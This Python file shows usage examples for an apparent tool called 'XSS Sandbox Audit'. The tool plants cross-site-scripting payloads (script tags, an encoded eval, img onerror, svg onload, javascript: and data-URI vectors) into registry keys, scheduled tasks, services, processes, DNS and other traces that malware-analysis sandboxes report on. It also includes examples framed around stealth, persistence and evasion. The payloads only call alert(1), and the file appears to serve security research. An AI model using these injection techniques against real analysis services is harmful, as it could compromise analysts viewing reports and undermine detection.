"""Advanced usage examples for XSS Sandbox Audit."""

import time
from xss_audit import XSSAuditor, XSSPayload


def example_staggered_injection():
    """Inject payloads with staggered timing."""
    print("Advanced Example 1: Staggered Injection")
    print("-" * 50)
    
    auditor = XSSAuditor()
    
    # Inject with longer delays for stealth
    vectors = [
        ("Files", auditor.inject_files),
        ("Registry", auditor.inject_registry),
        ("Environment", auditor.inject_environment),
        ("Network", auditor.inject_network),
    ]
    
    for name, inject_func in vectors:
        print(f"[+] Injecting into {name}...")
        inject_func()
        time.sleep(2)  # 2 second delay between vectors
    
    print("\nStaggered injection completed!\n")


def example_payload_variations():
    """Test multiple payload variations."""
    print("Advanced Example 2: Payload Variations")
    print("-" * 50)
    
    # Create different types of XSS payloads
    payloads = [
        # Script tag variations
        XSSPayload(
            id="var_001",
            type="script-basic",
            content='<script>alert(1)</script>',
            vector="files",
            description="Basic script tag"
        ),
        XSSPayload(
            id="var_002",
            type="script-encoded",
            content='<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
            vector="files",
            description="Encoded script"
        ),
        
        # Event handler variations
        XSSPayload(
            id="var_003",
            type="img-onerror",
            content='<img src=x onerror=alert(1)>',
            vector="files",
            description="Image onerror"
        ),
        XSSPayload(
            id="var_004",
            type="svg-onload",
            content='<svg/onload=alert(1)>',
            vector="files",
            description="SVG onload"
        ),
        
        # Protocol handlers
        XSSPayload(
            id="var_005",
            type="javascript-protocol",
            content='<a href="javascript:alert(1)">Click</a>',
            vector="files",
            description="JavaScript protocol"
        ),
        
        # Data URI
        XSSPayload(
            id="var_006",
            type="data-uri",
            content='<iframe src="data:text/html,<script>alert(1)</script>">',
            vector="files",
            description="Data URI"
        ),
    ]
    
    auditor = XSSAuditor(payloads=payloads)
    auditor.inject_files()
    
    print(f"\nInjected {len(payloads)} payload variations!\n")


def example_targeted_sandbox_test():
    """Target specific sandbox analysis points."""
    print("Advanced Example 3: Targeted Sandbox Test")
    print("-" * 50)
    
    auditor = XSSAuditor()
    
    # Focus on vectors that sandboxes analyze most
    print("[+] Phase 1: Process behavior...")
    auditor.inject_processes()
    auditor.inject_powershell()
    auditor.inject_cmd()
    time.sleep(1)
    
    print("[+] Phase 2: Network activity...")
    auditor.inject_network()
    auditor.inject_dns()
    time.sleep(1)
    
    print("[+] Phase 3: System modifications...")
    auditor.inject_registry()
    auditor.inject_tasks()
    auditor.inject_services()
    time.sleep(1)
    
    print("[+] Phase 4: File operations...")
    auditor.inject_files()
    auditor.inject_shortcuts()
    
    print("\nTargeted sandbox test completed!\n")


def example_persistence_vectors():
    """Focus on persistence mechanism vectors."""
    print("Advanced Example 4: Persistence Vectors")
    print("-" * 50)
    
    auditor = XSSAuditor()
    
    # Inject into persistence locations
    print("[+] Registry persistence...")
    auditor.inject_registry()
    
    print("[+] Scheduled task persistence...")
    auditor.inject_tasks()
    
    print("[+] Service persistence...")
    auditor.inject_services()
    
    print("[+] Shortcut persistence...")
    auditor.inject_shortcuts()
    
    print("\nPersistence vector injection completed!\n")


def example_evasion_focused():
    """Focus on evasion and anti-analysis vectors."""
    print("Advanced Example 5: Evasion-Focused")
    print("-" * 50)
    
    auditor = XSSAuditor()
    
    # Vectors that might evade detection
    print("[+] Environment variables (often not sanitized)...")
    auditor.inject_environment()
    
    print("[+] Debug output (low visibility)...")
    auditor.inject_debug()
    
    print("[+] Clipboard (transient)...")
    auditor.inject_clipboard()
    
    print("[+] WMI queries (legitimate-looking)...")
    auditor.inject_wmi()
    
    print("\nEvasion-focused injection completed!\n")


def example_comprehensive_report():
    """Generate comprehensive test report."""
    print("Advanced Example 6: Comprehensive Report")
    print("-" * 50)
    
    auditor = XSSAuditor()
    
    vectors = {
        "files": auditor.inject_files,
        "registry": auditor.inject_registry,
        "processes": auditor.inject_processes,
        "powershell": auditor.inject_powershell,
        "cmd": auditor.inject_cmd,
        "eventlogs": auditor.inject_eventlogs,
        "environment": auditor.inject_environment,
        "network": auditor.inject_network,
        "shortcuts": auditor.inject_shortcuts,
        "tasks": auditor.inject_tasks,
        "services": auditor.inject_services,
        "clipboard": auditor.inject_clipboard,
        "debug": auditor.inject_debug,
        "wmi": auditor.inject_wmi,
        "dns": auditor.inject_dns,
    }
    
    results = {}
    
    for name, inject_func in vectors.items():
        print(f"[+] Testing {name}...")
        try:
            inject_func()
            results[name] = "SUCCESS"
        except Exception as e:
            results[name] = f"FAILED: {str(e)}"
        time.sleep(0.1)
    
    print("\n" + "=" * 50)
    print("INJECTION REPORT")
    print("=" * 50)
    
    for vector, status in results.items():
        status_symbol = "✓" if status == "SUCCESS" else "✗"
        print(f"{status_symbol} {vector:15} - {status}")
    
    success_count = sum(1 for s in results.values() if s == "SUCCESS")
    total_count = len(results)
    
    print("=" * 50)
    print(f"Success Rate: {success_count}/{total_count} ({success_count/total_count*100:.1f}%)")
    print("=" * 50)
    print()


if __name__ == "__main__":
    print("=" * 50)
    print("XSS Sandbox Audit - Advanced Examples")
    print("=" * 50)
    print()
    
    # Run advanced examples
    example_staggered_injection()
    example_payload_variations()
    example_targeted_sandbox_test()
    example_persistence_vectors()
    example_evasion_focused()
    example_comprehensive_report()
    
    print("=" * 50)
    print("All advanced examples completed!")
    print("=" * 50)
